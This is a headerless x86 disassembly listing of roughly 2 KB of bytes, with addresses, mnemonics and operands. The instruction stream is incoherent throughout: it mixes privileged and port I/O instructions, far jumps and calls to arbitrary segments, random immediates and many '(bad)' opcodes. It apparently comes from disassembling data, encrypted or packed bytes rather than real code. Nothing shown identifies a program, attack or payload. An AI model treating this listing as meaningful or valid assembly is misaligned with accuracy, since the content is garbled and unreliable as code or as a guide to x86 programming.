  407768:	into   
  407769:	popf   
  40776a:	pop    eax
  40776b:	retf   0x6705
  40776e:	pop    es
  40776f:	out    0x3f,al
  407771:	inc    eax
  407772:	les    ecx,FWORD PTR [edx+0x64]
  407775:	es lahf 
  407777:	xor    BYTE PTR [edx-0x30],bl
  40777a:	sbb    BYTE PTR [ecx],0xeb
  40777d:	inc    esi
  40777e:	aaa    
  40777f:	push   edi
  407780:	mov    bh,0x5
  407782:	imul   ecx,DWORD PTR [ebx-0x2b],0x0
  407786:	xor    edx,DWORD PTR [esi+esi*4]
  407789:	xchg   esp,eax
  40778a:	cwde   
  40778b:	sbb    eax,0xc592565a
  407790:	retf   0x17dc
  407793:	daa    
  407794:	pop    ss
  407795:	fsub   QWORD PTR [edi+0x3ece14f]
  40779b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40779c:	adc    DWORD PTR [ecx],ecx
  40779e:	lods   eax,DWORD PTR ds:[esi]
  40779f:	inc    esp
  4077a0:	popa   
  4077a1:	push   ebx
  4077a2:	js     0x407724
  4077a4:	fistp  WORD PTR [eax+eax*4+0x35]
  4077a8:	inc    edx
  4077a9:	jns    0x407761
  4077ab:	adc    cl,bh
  4077ad:	mov    ch,0x2a
  4077af:	cmp    eax,0xa63a0540
  4077b4:	pushf  
  4077b5:	stos   DWORD PTR es:[edi],eax
  4077b6:	dec    esp
  4077b7:	mov    ds:0xac088c3f,eax
  4077bc:	addr16 push ds
  4077be:	neg    BYTE PTR [eax-0x5]
  4077c1:	xchg   esp,eax
  4077c2:	retf   
  4077c3:	adc    dh,BYTE PTR [ebx+0x395e7f1e]
  4077c9:	cli    
  4077ca:	fisttp WORD PTR [ecx]
  4077cc:	pop    ebx
  4077cd:	rcr    DWORD PTR [eax],cl
  4077cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077d0:	cwde   
  4077d1:	bound  esp,QWORD PTR [edi]
  4077d3:	or     eax,0x7e1185a8
  4077d8:	push   esp
  4077d9:	cwde   
  4077da:	cmp    DWORD PTR [eax],ebp
  4077dc:	cwde   
  4077dd:	add    ch,BYTE PTR [edx]
  4077df:	xchg   BYTE PTR [eax-0x564a23d2],bl
  4077e5:	pop    ecx
  4077e6:	jnp    0x40780c
  4077e8:	sub    ah,BYTE PTR [edx*2+0x1d04900b]
  4077ef:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4077f1:	or     ebp,DWORD PTR [esi]
  4077f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077f4:	mov    bh,0xd7
  4077f6:	out    0x1a,al
  4077f8:	xor    DWORD PTR [esi],ecx
  4077fa:	mov    edi,0x5c407931
  4077ff:	out    dx,al
  407800:	xchg   ebx,eax
  407801:	push   ecx
  407802:	stc    
  407803:	push   edi
  407804:	(bad)  [ebx+esi*1]
  407807:	(bad)  
  407808:	mov    esp,0xc1c34f63
  40780d:	push   0x8f482c95
  407812:	cmp    BYTE PTR [edi+0x1e],ch
  407815:	adc    eax,0x8d61d96c
  40781a:	push   DWORD PTR [ebx+0x188741be]
  407820:	fsub   st(5),st
  407822:	push   edx
  407823:	das    
  407824:	add    ah,al
  407826:	mov    cl,0x66
  407828:	call   0xfca02cac
  40782d:	pop    esp
  40782e:	xor    DWORD PTR [ebp-0x28],edi
  407831:	scas   eax,DWORD PTR es:[edi]
  407832:	icebp  
  407833:	mov    WORD PTR [ecx],ds
  407835:	mov    edi,0x22e30282
  40783a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40783b:	fiadd  DWORD PTR [ecx-0x6e]
  40783e:	push   esi
  40783f:	icebp  
  407840:	and    al,0x92
  407842:	adc    ebx,DWORD PTR [ecx-0x3d]
  407845:	mov    dh,0x8b
  407847:	int    0xec
  407849:	test   eax,0x3daab56b
  40784e:	xchg   ecx,eax
  40784f:	xchg   DWORD PTR [ebx+0x33a98e71],edx
  407855:	fcmovnb st,st(2)
  407857:	push   0xffffffb4
  407859:	scas   eax,DWORD PTR es:[edi]
  40785a:	add    esp,DWORD PTR [ebp-0x64ad68ae]
  407860:	sbb    BYTE PTR [ebp+0x4f790d44],0x44
  407867:	lea    edx,[esi+ebx*8+0x0]
  40786b:	clc    
  40786c:	ret    0x4d70
  40786f:	inc    edi
  407870:	cmp    eax,0xbbccf8
  407875:	mov    BYTE PTR [ebx+0x63],dh
  407878:	test   BYTE PTR [ebx-0x74],al
  40787b:	mov    DWORD PTR [edx],ebp
  40787d:	fcom   st(0)
  40787f:	test   BYTE PTR [ebx+0x7],bl
  407882:	sar    DWORD PTR [esi+0x686fd2b4],1
  407888:	dec    esi
  407889:	or     ah,al
  40788b:	mov    ecx,ebp
  40788d:	mov    bh,dh
  40788f:	cmp    BYTE PTR [eax+0x587431c6],bl
  407895:	add    eax,0x4f5e4f57
  40789a:	inc    esp
  40789b:	mov    ch,0x0
  40789d:	mov    ds:0x761c3f9d,al
  4078a2:	or     bh,BYTE PTR [esi+eax*4+0xf]
  4078a6:	xor    al,BYTE PTR [eax]
  4078a8:	lea    esi,[ecx-0x33a7219b]
  4078ae:	xchg   esi,eax
  4078af:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4078b1:	jmp    0xc9b7:0x5f23100b
  4078b8:	mov    edx,0xfb40ca36
  4078bd:	rol    al,1
  4078bf:	sbb    al,0x1e
  4078c1:	cmp    BYTE PTR [eax],ah
  4078c3:	iret   
  4078c4:	and    ch,BYTE PTR [eax-0x7c04da09]
  4078ca:	cmp    BYTE PTR [ecx+edi*8-0x3e],dh
  4078ce:	inc    eax
  4078cf:	and    eax,0xd938238d
  4078d4:	fdiv   QWORD PTR [edx]
  4078d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078d7:	and    ebx,eax
  4078d9:	mov    al,BYTE PTR [ecx]
  4078db:	repz mov edi,0x3dfd40a6
  4078e1:	ins    BYTE PTR es:[edi],dx
  4078e2:	adc    DWORD PTR [eax-0x7f7b9bb8],eax
  4078e8:	je     0x4078f4
  4078ea:	and    DWORD PTR [eax-0x6],esp
  4078ed:	cmc    
  4078ee:	jae    0x407873
  4078f0:	loope  0x40795b
  4078f2:	mov    ds:0x50ab9599,eax
  4078f7:	mov    eax,0xab4251af
  4078fc:	and    eax,DWORD PTR [ecx-0x58]
  4078ff:	cli    
  407900:	mov    ch,0x22
  407902:	movntps XMMWORD PTR [ecx+0x4f6f44f9],xmm7
  407909:	popf   
  40790a:	mov    ah,0x42
  40790c:	sub    al,0x47
  40790e:	lahf   
  40790f:	iret   
  407910:	test   BYTE PTR [eax],cl
  407912:	sub    DWORD PTR [ebx+0x24],edx
  407915:	cs inc ebx
  407917:	xchg   edx,ebp
  407919:	test   BYTE PTR [ebp+0x2b],bl
  40791c:	loope  0x40790c
  40791e:	cmp    BYTE PTR [esi+ebx*1+0x16224692],ch
  407925:	arpl   WORD PTR [eax+0xf4709dd],dx
  40792b:	les    ebp,FWORD PTR [edx]
  40792d:	ficom  WORD PTR [edi]
  40792f:	es mov cl,0x37
  407932:	aad    0x3b
  407934:	loop   0x407997
  407936:	pop    eax
  407937:	pop    edx
  407938:	add    BYTE PTR [ebp+ecx*8-0x7735ac50],dh
  40793f:	(bad)  
  407940:	mov    al,ds:0xf10123b8
  407945:	xor    DWORD PTR [esi],esp
  407947:	push   0x30
  407949:	std    
  40794a:	neg    BYTE PTR [bx-0x12]
  40794e:	fwait
  40794f:	xor    al,bh
  407951:	mov    eax,ds:0x59753cc
  407956:	fisttp WORD PTR [edi-0x354d15c5]
  40795c:	ficomp DWORD PTR [eax]
  40795e:	clc    
  40795f:	lea    eax,[ecx+esi*8]
  407962:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407963:	(bad)  
  407964:	jnp    0x4079c7
  407966:	sahf   
  407967:	and    al,BYTE PTR [eax+0x58]
  40796a:	jb     0x407997
  40796c:	mov    ch,BYTE PTR [ebp-0x6ed60f11]
  407972:	imul   ebx,DWORD PTR [edi+ebx*1-0x1ba8085d],0xffffff9f
  40797a:	pusha  
  40797b:	xchg   DWORD PTR [ecx-0x14],esi
  40797e:	xlat   BYTE PTR ds:[ebx]
  40797f:	jno    0x407987
  407981:	out    dx,al
  407982:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407983:	adc    eax,eax
  407985:	pushw  es
  407987:	test   ebx,esi
  407989:	ss ins DWORD PTR es:[edi],dx
  40798b:	loopne 0x407968
  40798d:	xor    al,0xbb
  40798f:	dec    ecx
  407990:	lods   al,BYTE PTR ds:[esi]
  407992:	out    dx,eax
  407993:	(bad)  
  407994:	sub    ebp,DWORD PTR [esi+0x4c70ca06]
  40799a:	cmp    al,0xe7
  40799c:	aad    0xe2
  40799e:	test   DWORD PTR [edx+0x26],esp
  4079a1:	mov    edx,0x718d9c84
  4079a6:	mov    ?,eax
  4079a8:	fsubr  DWORD PTR [ecx-0x5b962205]
  4079af:	xchg   edi,eax
  4079b0:	rcr    DWORD PTR [ecx],1
  4079b2:	ret    
  4079b3:	sbb    BYTE PTR [ecx-0x63],cl
  4079b6:	int3   
  4079b7:	mov    eax,0x744db7a9
  4079bc:	ficom  DWORD PTR [edx-0x5fa21887]
  4079c2:	dec    esp
  4079c3:	in     al,dx
  4079c4:	popf   
  4079c5:	xchg   BYTE PTR [edi+edi*4-0x3b],ah
  4079c9:	mov    eax,0x31293635
  4079ce:	or     dh,BYTE PTR [ecx]
  4079d0:	mov    eax,ds:0x6e6c213a
  4079d5:	int    0x99
  4079d7:	int3   
  4079d8:	add    al,BYTE PTR [eax+0x149a085e]
  4079de:	adc    dl,BYTE PTR [ebp+0x51bd87a]
  4079e4:	(bad)  
  4079e5:	and    edi,DWORD PTR [ebx-0x34d89c46]
  4079eb:	or     edx,DWORD PTR ds:0x5b735823
  4079f1:	jmp    0x7bb4:0x43a1b647
  4079f8:	into   
  4079f9:	push   edx
  4079fa:	stos   DWORD PTR es:[edi],eax
  4079fb:	inc    ebx
  4079fc:	cmp    BYTE PTR [ebx-0x3e4f0a5e],dh
  407a02:	mov    dh,0x74
  407a04:	lds    esp,FWORD PTR [edi]
  407a06:	test   edx,ebp
  407a08:	sub    al,0x7a
  407a0b:	xor    BYTE PTR [ebp+0x1bd13de],ch
  407a11:	mov    cs,WORD PTR [ecx-0x6d672717]
  407a17:	pop    es
  407a18:	nop    DWORD PTR [edi-0x2e5a6330]
  407a1f:	fist   WORD PTR [edi+0x1]
  407a22:	imul   esi,DWORD PTR [esp+eax*4],0xaa4d0e48
  407a29:	sar    BYTE PTR [ecx+0x3d],cl
  407a2c:	push   ss
  407a2d:	mov    ecx,0x89821f56
  407a32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a33:	adc    al,0x14
  407a35:	adc    dh,BYTE PTR [eax+0x1e7db661]
  407a3b:	ficomp WORD PTR ds:0xba0ba8d5
  407a41:	fimul  WORD PTR [edx-0x42ce9b7f]
  407a47:	cmp    esi,DWORD PTR [ecx+ebx*1]
  407a4a:	jb     0x407a4e
  407a4c:	(bad)  
  407a4d:	xchg   ecx,eax
  407a4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a4f:	mov    al,ds:0x9505747e
  407a54:	inc    edi
  407a55:	leave  
  407a56:	inc    edx
  407a57:	les    esi,FWORD PTR [eax+edx*4-0x2c]
  407a5b:	aaa    
  407a5c:	fwait
  407a5d:	out    dx,al
  407a5e:	cwde   
  407a5f:	outs   dx,BYTE PTR ds:[esi]
  407a60:	pop    ss
  407a61:	jne    0x407ab4
  407a63:	inc    esi
  407a64:	dec    esi
  407a65:	into   
  407a66:	in     eax,dx
  407a67:	fmul   DWORD PTR [ecx]
  407a69:	fidiv  WORD PTR [esi-0xd5d0f93]
  407a6f:	lds    edi,FWORD PTR [edi-0x46095618]
  407a75:	call   0x3457:0xa0c5b64a
  407a7c:	pop    eax
  407a7d:	push   esi
  407a7e:	aaa    
  407a7f:	test   eax,0x62dada59
  407a84:	(bad)  
  407a85:	jge    0x407a4c
  407a87:	sar    DWORD PTR [esi+0x68],1
  407a8a:	enter  0x1b1d,0xed
  407a8e:	mov    ds:0xf350f73e,eax
  407a93:	enter  0x2b15,0xfe
  407a97:	cdq    
  407a98:	nop
  407a99:	ror    esp,cl
  407a9b:	mov    ds:0x83cbef94,eax
  407aa0:	mov    eax,ds:0x11527c80
  407aa5:	add    DWORD PTR [ebp-0x5e623a40],eax
  407aab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407aac:	pop    esi
  407aad:	stos   BYTE PTR es:[edi],al
  407aae:	sti    
  407aaf:	xchg   esp,eax
  407ab0:	into   
  407ab1:	xor    eax,0x926f849c
  407ab6:	mov    al,0x2b
  407ab8:	sbb    ah,BYTE PTR [eax-0x238f9123]
  407abe:	hlt    
  407abf:	add    edi,DWORD PTR ss:[ebx+0x6a0d8e6c]
  407ac6:	cdq    
  407ac7:	lea    eax,[ebx]
  407ac9:	and    ebx,DWORD PTR [ecx-0x2d]
  407acc:	cld    
  407acd:	in     al,0xb
  407acf:	sti    
  407ad0:	mul    BYTE PTR [eax+0x72]
  407ad3:	rcl    bh,cl
  407ad5:	inc    ebx
  407ad6:	xor    al,0xbf
  407ad8:	into   
  407ad9:	mov    ebp,0xf3d8dbd2
  407ade:	pop    ebx
  407adf:	and    edx,0x70
  407ae2:	leave  
  407ae3:	fist   DWORD PTR [ebp-0x73]
  407ae6:	iret   
  407ae7:	aas    
  407ae8:	out    dx,al
  407ae9:	addr16 mov esi,0x11ab55ce
  407aef:	aad    0xc5
  407af1:	jb     0x407b29
  407af3:	jp     0x407afc
  407af5:	and    esi,eax
  407af7:	mov    edi,0xc6390593
  407afc:	ret    
  407afd:	mov    ecx,0x893efeda
  407b02:	outs   dx,DWORD PTR ds:[esi]
  407b03:	jg     0x407b30
  407b05:	mov    edx,0x617eb4bd
  407b0a:	mov    ds:0xa4048ebd,al
  407b0f:	mov    al,0x8b
  407b11:	repz jmp 0xb27fe8fc
  407b17:	adc    edx,DWORD PTR [eax+0x58801e25]
  407b1d:	fstp   QWORD PTR [ebx-0x7b2b548b]
  407b23:	icebp  
  407b24:	mov    es,WORD PTR [eax+0x5e]
  407b27:	jmp    0x3605:0x31b0ee96
  407b2e:	sti    
  407b2f:	mov    dl,BYTE PTR [ecx-0x6d81fd4d]
  407b35:	jb     0x407b7f
  407b37:	adc    BYTE PTR [ebx+0x37],ah
  407b3a:	loope  0x407b05
  407b3c:	mov    bl,0x71
  407b3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b3f:	test   al,0x8e
  407b41:	outs   dx,BYTE PTR ds:[esi]
  407b42:	mov    esi,0xc0cb0951
  407b47:	xor    eax,0xb3d0a870
  407b4c:	outs   dx,DWORD PTR ds:[esi]
  407b4d:	push   ebp
  407b4e:	push   eax
  407b4f:	cmp    edx,DWORD PTR [bp+di-0x375d]
  407b54:	push   0x72
  407b56:	repnz sbb al,0xa2
  407b59:	cmp    eax,0x75ef05da
  407b5e:	xor    BYTE PTR [ecx-0xa2889b9],bh
  407b64:	adc    ebp,DWORD PTR ds:0x21dc4bfd
  407b6a:	fcmovbe st,st(2)
  407b6c:	jp     0x407bc6
  407b6e:	out    0xc,al
  407b70:	adc    cl,BYTE PTR [esi-0x7e]
  407b73:	mov    dh,0xa
  407b75:	jl     0x407bcc
  407b77:	popf   
  407b78:	div    BYTE PTR [edi]
  407b7a:	jmp    ebx
  407b7c:	ss jg  0x407bf4
  407b7f:	das    
  407b80:	jmp    DWORD PTR [ecx+0x12babccd]
  407b86:	mov    bl,0xd9
  407b88:	xchg   dl,cl
  407b8a:	pop    esp
  407b8b:	stos   BYTE PTR es:[edi],al
  407b8c:	ss aaa 
  407b8e:	xchg   BYTE PTR [ebp-0x2c],dh
  407b91:	das    
  407b92:	push   ecx
  407b93:	or     BYTE PTR [ebx-0x1a],bl
  407b96:	fucom  st(4)
  407b98:	lock and dl,0xab
  407b9c:	imul   edx,DWORD PTR [edx+0x36],0x20ac02da
  407ba3:	inc    edx
  407ba4:	mov    bl,bh
  407ba6:	mov    bl,0x7e
  407ba8:	push   es
  407ba9:	les    ebp,FWORD PTR [eax-0x35f6df9a]
  407baf:	jle    0x407c2c
  407bb1:	add    eax,0xf6cd83ea
  407bb6:	test   cl,0x82
  407bb9:	dec    ebp
  407bba:	sbb    DWORD PTR [edx+0x7b],eax
  407bbd:	adc    al,0x48
  407bbf:	cs test al,0x6
  407bc2:	xor    esp,DWORD PTR [edi+0x1e]
  407bc5:	mov    esi,0x217fd02f
  407bca:	push   ds
  407bcb:	xor    eax,0x862eb3e9
  407bd0:	in     eax,dx
  407bd1:	push   0x8dea98f4
  407bd6:	xchg   ch,dl
  407bd8:	mov    al,ds:0xb9bc7c9
  407bdd:	dec    ecx
  407bde:	pop    ds
  407bdf:	push   cs
  407be0:	jmp    0x9c03:0xd8235ae0
  407be7:	xor    al,0xe1
  407be9:	cdq    
  407bea:	dec    ebp
  407beb:	or     al,0x41
  407bed:	mov    bh,0x18
  407bef:	sub    al,0x1f
  407bf1:	mov    dl,BYTE PTR [eax+0x2a7142b3]
  407bf7:	or     DWORD PTR [edx-0x5d8373d0],0xffffffeb
  407bfe:	das    
  407bff:	jns    0x407c77
  407c01:	mov    al,BYTE PTR [ebp-0x65]
  407c04:	sub    eax,0xa6649aa9
  407c09:	pop    esi
  407c0a:	inc    ebx
  407c0b:	mov    eax,es:0x8e49f619
  407c11:	inc    ecx
  407c12:	or     eax,0xa37c80b5
  407c17:	sub    al,BYTE PTR [ebx]
  407c19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c1a:	les    ecx,FWORD PTR [edx-0x486efe23]
  407c20:	stos   BYTE PTR es:[edi],al
  407c21:	popa   
  407c22:	push   eax
  407c23:	(bad)
  407c26:	push   edi
  407c27:	adc    esi,DWORD PTR [edx]
  407c29:	daa    
  407c2a:	mov    al,ds:0xb9b68102
  407c2f:	push   edi
  407c30:	jge    0x407c05
  407c32:	lea    esi,[ecx-0x5fa2f13e]
  407c38:	inc    ebx
  407c39:	(bad)  
  407c3a:	xchg   edx,eax
  407c3b:	mov    ds:0xf1aaa2ce,eax
  407c40:	dec    ebp
  407c41:	in     eax,dx
  407c42:	pop    esp
  407c43:	loope  0x407c1e
  407c45:	mov    cs,edi
  407c47:	lock (bad) 
  407c4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c4b:	add    al,0x2b
  407c4d:	xlat   BYTE PTR ds:[bx]
  407c4f:	push   esp
  407c50:	data16 jl 0x407c42
  407c53:	add    bh,BYTE PTR [edx-0x6c6c740d]
  407c59:	loope  0x407bdd
  407c5b:	mov    ds:0x7f15441f,eax
  407c60:	aaa    
  407c61:	call   0x4042:0x85bdcb80
  407c68:	test   DWORD PTR [edx+0x5b],ecx
  407c6b:	out    dx,eax
  407c6c:	jp     0x407c3b
  407c6e:	mov    dh,0x72
  407c70:	xor    ch,dh
  407c72:	loopne 0x407cab
  407c74:	test   BYTE PTR [ebx-0x550a539a],ah
  407c7a:	add    eax,0xc83b4765
  407c7f:	mov    esp,0xe026138
  407c84:	stc    
  407c85:	adc    DWORD PTR [ebx-0x7f09df20],esp
  407c8b:	jbe    0x407c5b
  407c8d:	jle    0x407c26
  407c8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c90:	and    dl,dl
  407c92:	data16 mov ah,0x42
  407c95:	(bad)  
  407c97:	mov    esi,0xcb383214
  407c9c:	jbe    0x407c64
  407c9e:	test   DWORD PTR [ebp+0x4b2c404d],ebp
  407ca4:	jmp    0xac86:0xbf4399cd
  407cab:	pop    ecx
  407cac:	scas   al,BYTE PTR es:[edi]
  407cad:	ins    DWORD PTR es:[edi],dx
  407cae:	or     bl,BYTE PTR [ecx-0x24]
  407cb1:	outs   dx,BYTE PTR ds:[esi]
  407cb2:	loope  0x407ce3
  407cb4:	pop    eax
  407cb5:	int    0xf7
  407cb7:	adc    eax,0x202cec5f
  407cbc:	mov    ds:0xa5d4081c,eax
  407cc1:	loopne 0x407cf2
  407cc3:	imul   ecx,DWORD PTR [edi-0x75],0x60
  407cc7:	sbb    eax,0x419a5877
  407ccc:	fdiv   QWORD PTR ds:0xeacab566
  407cd2:	xor    eax,0x225f5c7e
  407cd7:	cmp    BYTE PTR [ecx+0x3f],bh
  407cda:	xor    al,0x4c
  407cdc:	icebp  
  407cdd:	ins    BYTE PTR es:[edi],dx
  407cde:	jl     0x407caa
  407ce0:	mov    al,ds:0xd2b4ff6a
  407ce5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ce6:	mov    edi,0xffbf3193
  407ceb:	xchg   edx,eax
  407cec:	mov    cl,0x2d
  407cee:	adc    ebp,DWORD PTR [edx-0x55]
  407cf1:	mov    ds:0x4b24514c,al
  407cf6:	push   es
  407cf7:	stc    
  407cf8:	scas   eax,DWORD PTR es:[edi]
  407cf9:	push   ds
  407cfa:	hlt    
  407cfb:	push   esi
  407cfc:	or     dl,0xbb
  407cff:	jne    0x407d7d
  407d01:	cs xchg ecx,eax
  407d03:	aad    0xfb
  407d05:	push   0xe
  407d07:	pop    eax
  407d08:	scas   eax,DWORD PTR es:[edi]
  407d09:	sbb    DWORD PTR [esi-0x70],ebx
  407d0c:	mov    ebp,0x29dbaa5e
  407d11:	sar    DWORD PTR [esi+0x27],0xce
  407d15:	mov    ecx,0x30c999fc
  407d1a:	push   ss
  407d1b:	fcmovnb st,st(4)
  407d1d:	mov    eax,ds:0x59d1a30a
  407d22:	in     eax,dx
  407d23:	daa    
  407d24:	test   BYTE PTR [edi],ch
  407d26:	sbb    cl,0xaa
  407d29:	sar    BYTE PTR [edx],cl
  407d2b:	inc    ebp
  407d2c:	push   esi
  407d2d:	or     eax,0x24a9ceb
  407d32:	adc    DWORD PTR [esi-0x13],ebx
  407d35:	shr    bh,1
  407d37:	sahf   
  407d38:	lahf   
  407d39:	data16 jmp 0x407cf4
  407d3c:	xchg   BYTE PTR [ebp+0x6ac00a2],dh
  407d42:	ins    DWORD PTR es:[edi],dx
  407d43:	inc    ecx
  407d44:	xchg   esi,eax
  407d45:	mov    BYTE PTR [eax+ecx*8],al
  407d48:	cmpps  xmm4,xmm2,0xb7
  407d4c:	js     0x407d45
  407d4e:	fwait
  407d4f:	mov    ebp,0xfd64afb2
  407d54:	(bad)
  407d57:	test   ebx,edi
  407d59:	pop    ds
  407d5a:	stos   DWORD PTR es:[edi],eax
  407d5b:	cmp    DWORD PTR [esi+ecx*2+0x330f22a5],ecx
  407d62:	inc    edi
  407d63:	fwait
  407d64:	push   0x1d82dc73
  407d69:	test   eax,0x2dffab71
  407d6e:	repz fdiv DWORD PTR [edx]
  407d71:	sbb    eax,0x98d2da36
  407d76:	or     al,0x5e
  407d78:	adc    ecx,DWORD PTR [edx-0x521e4f9]
  407d7e:	inc    ebp
  407d7f:	ds dec esi
  407d81:	sub    eax,0x675d4fe7
  407d86:	gs daa 
  407d88:	ins    DWORD PTR es:[edi],dx
  407d89:	dec    esi
  407d8a:	in     eax,dx
  407d8b:	xchg   ebp,edx
  407d8d:	jnp    0x407d16
  407d8f:	aam    0xa6
  407d91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d92:	lds    ebp,FWORD PTR ds:0x5b4a8c1b
  407d98:	mov    DWORD PTR [eax-0x6938b887],esp
  407d9e:	or     bl,0xb6
  407da1:	ins    BYTE PTR es:[edi],dx
  407da2:	push   edi
  407da3:	in     eax,dx
  407da4:	jnp    0x407db3
  407da6:	scas   eax,DWORD PTR es:[edi]
  407da7:	lock mov esp,0x83f7dc98
  407dad:	mov    ebp,0x6ace3e87
  407db2:	cld    
  407db3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407db4:	pop    ss
  407db5:	clc    
  407db6:	test   DWORD PTR [edi-0x4d],ebp
  407db9:	adc    edx,DWORD PTR [eax+0x4e1849ad]
  407dbf:	addr16 lahf 
  407dc1:	data16 add al,0x39
  407dc4:	push   eax
  407dc5:	jmp    0x1bf55051
  407dca:	dec    edi
  407dcb:	out    0x8c,eax
  407dcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407dce:	inc    ecx
  407dcf:	pop    ss
  407dd0:	adc    edi,DWORD PTR [ebp-0x423b66d3]
  407dd6:	jecxz  0x407de6
  407dd8:	cli    
  407dd9:	hlt    
  407dda:	(bad)  
  407ddb:	jmp    0x407dc3
  407ddd:	rcl    DWORD PTR [ecx],1
  407ddf:	fadd   st,st(7)
  407de1:	int3   
  407de2:	and    al,0x46
  407de4:	loope  0x407d7f
  407de6:	push   ecx
  407de7:	pop    ss
  407de8:	cmp    ecx,DWORD PTR [ecx-0x18]
  407deb:	and    al,0xce
  407ded:	adc    eax,0x3eacdb5d
  407df2:	rol    ah,cl
  407df4:	or     BYTE PTR [edi],bl
  407df6:	cdq    
  407df7:	inc    edx
  407df8:	(bad)  
  407df9:	clc    
  407dfa:	outs   dx,DWORD PTR ds:[esi]
  407dfb:	adc    edx,DWORD PTR [eax-0x5ed0e989]
  407e01:	mov    bl,0xc6
  407e03:	sub    DWORD PTR [edi+0x66],eax
  407e06:	div    DWORD PTR [edx]
  407e08:	rol    DWORD PTR [ecx+0x11],1
  407e0b:	mov    ebp,0xedbb9378
  407e10:	loopne 0x407db6
  407e12:	aad    0x33
  407e14:	mov    al,0x60
  407e16:	or     BYTE PTR [edx],dh
  407e18:	jae    0x407e5a
  407e1a:	sbb    esp,ebp
  407e1c:	in     al,dx
  407e1d:	dec    eax
  407e1e:	pop    eax
  407e1f:	mov    ds:0xd76b927a,al
  407e24:	cdq    
  407e25:	inc    ebx
  407e26:	idiv   edi
  407e28:	mov    edx,0x73279dcc
  407e2d:	mov    al,0x99
  407e2f:	call   DWORD PTR [esi-0x55]
  407e32:	arpl   WORD PTR [edi],ax
  407e34:	pop    ebp
  407e35:	adc    DWORD PTR [ebx-0x2e52b0c4],ebx
  407e3b:	imul   edx,DWORD PTR [esi+0x48],0xb0e5f28
  407e42:	jmp    0xe888e2ea
  407e47:	jecxz  0x407ebe
  407e49:	je     0x407e43
  407e4b:	shl    BYTE PTR [ebx],1
  407e4d:	aas    
  407e4e:	in     eax,0x19
  407e50:	mov    ds:0xb3f2b4f9,eax
  407e55:	call   0x56017160
  407e5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e5b:	inc    BYTE PTR [ebx]
  407e5d:	lods   eax,DWORD PTR ds:[esi]
  407e5e:	jae    0x407e78
  407e60:	sti    
  407e61:	enter  0x60c2,0x83
  407e65:	adc    DWORD PTR [esi+eiz*4-0x5c019192],esp
  407e6c:	enter  0xf2b6,0xc5
  407e70:	icebp  
  407e71:	push   ebx
  407e73:	xor    al,0x9e
  407e75:	les    eax,FWORD PTR [eax-0x41]
  407e78:	loope  0x407ecd
  407e7a:	aad    0xad
  407e7c:	(bad)  
  407e7d:	mov    edi,0xdd80962b
  407e82:	test   BYTE PTR [edx-0x6d],cl
  407e85:	icebp  
  407e86:	fstp   DWORD PTR ds:0xeaec4554
  407e8c:	fisubr DWORD PTR [ecx]
  407e8e:	call   0x4049:0x6d9ae095
  407e95:	adc    cl,BYTE PTR [eax-0x4b9eaa01]
  407e9b:	cmp    al,BYTE PTR [ebx-0x47]
  407e9e:	inc    esi
  407e9f:	mov    ecx,0x78b736cc
  407ea4:	inc    ebx
  407ea5:	jle    0x407efe
  407ea7:	fwait
  407ea8:	pop    es
  407ea9:	sub    BYTE PTR [edi-0x20],ch
  407eac:	mov    ds:0xebbdaf38,al
  407eb1:	push   eax
  407eb2:	jo     0x407e43
  407eb4:	not    BYTE PTR ds:0xe0e433a3
  407eba:	je     0x407e50
  407ebc:	and    ah,ch
  407ebe:	(bad)  
  407ebf:	repnz xor BYTE PTR [edx],ch
  407ec2:	stos   BYTE PTR es:[edi],al
  407ec3:	cdq    
  407ec4:	jnp    0x407eb5
  407ec6:	ss or  al,0x2d
  407ec9:	hlt    
  407eca:	pop    esi
  407ecb:	inc    ebp
  407ecc:	sbb    eax,edi
  407ece:	adc    cl,BYTE PTR [edx+eax*4]
  407ed1:	sub    DWORD PTR [eax+0x3880d1c2],0xf7fadd4b
  407edb:	ds mov ebp,0x96d41b2e
  407ee1:	gs dec ebx
  407ee3:	add    eax,0x665c0b12
  407ee8:	dec    ebp
  407ee9:	sub    al,0x7f
  407eeb:	xchg   esi,eax
  407eec:	push   ebx
  407eed:	into   
  407eee:	xor    ch,bl
  407ef0:	mov    ebp,0x78129aa3
  407ef5:	and    esp,eax
  407ef7:	arpl   sp,cx
  407ef9:	dec    edx
  407efa:	inc    ecx
  407efb:	jnp    0x407f37
  407efd:	jo     0x407e83
  407eff:	lock mov ah,0xba
  407f02:	inc    ecx
  407f03:	mov    ebp,0xc012319
  407f08:	or     ch,dh
  407f0a:	xor    al,bl
  407f0c:	mov    BYTE PTR [ebx],dh
  407f0e:	inc    edi
  407f0f:	mov    esp,0xf9bdbc2f
  407f14:	push   eax
  407f15:	shr    ebp,0x63
  407f18:	jle    0x407f1e
  407f1a:	or     BYTE PTR [edi+edi*8],bl
  407f1d:	cmp    BYTE PTR [edi],bl
  407f1f:	ret    0xa864
  407f22:	xlat   BYTE PTR ds:[ebx]
  407f23:	sbb    eax,0x14d6197
  407f28:	mov    esp,DWORD PTR [edi]
  407f2a:	mov    ebx,0xc5ed604f
  407f2f:	sbb    edi,DWORD PTR [eax]
  407f31:	xor    esp,DWORD PTR [ebx-0x337ebb36]
  407f37:	cmp    BYTE PTR [ebx+0x4ab746d3],ch
  407f3d:	jg     0x407f78
